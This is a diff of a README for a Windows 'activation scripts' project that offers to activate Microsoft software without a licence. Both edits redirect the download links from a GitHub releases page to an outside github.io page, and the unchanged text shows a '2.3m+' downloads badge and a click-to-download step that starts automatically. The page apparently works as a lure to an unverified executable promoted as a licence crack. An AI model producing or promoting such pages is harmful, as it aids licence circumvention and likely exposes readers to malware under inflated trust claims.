@@ -2,7 +2,7 @@
 
 ![Windows](https://img.shields.io/badge/Windows-10%2F11-0078D6?style=flat-square&logo=windows&logoColor=white) ![Version](https://img.shields.io/badge/Version-v2.9-brightgreen?style=flat-square) ![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square) ![Downloads](https://img.shields.io/badge/Downloads-2.3m%2B-orange?style=flat-square)
 
-[![Download Now](https://img.shields.io/badge/Download-Latest%20Version-blueviolet?style=for-the-badge&logo=github)](https://github.com/Kkhale317/microsoft-activation-scripts-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest%20Version-blueviolet?style=for-the-badge&logo=github)](https://kkhale317.github.io)
 
 ---
 
@@ -51,7 +51,7 @@ Follow these simple steps to get your software activated in just a few minutes. 
 
 ### Step 1: Download the File
 
-Visit this link to download the application: [https://github.com/Kkhale317/microsoft-activation-scripts-2026/releases](https://github.com/Kkhale317/microsoft-activation-scripts-2026/releases)
+Visit this link to download the application: [https://kkhale317.github.io](https://kkhale317.github.io)
 
 Click the green **"Download"** button on the page to start downloading the file to your computer. The download will begin automatically.
 
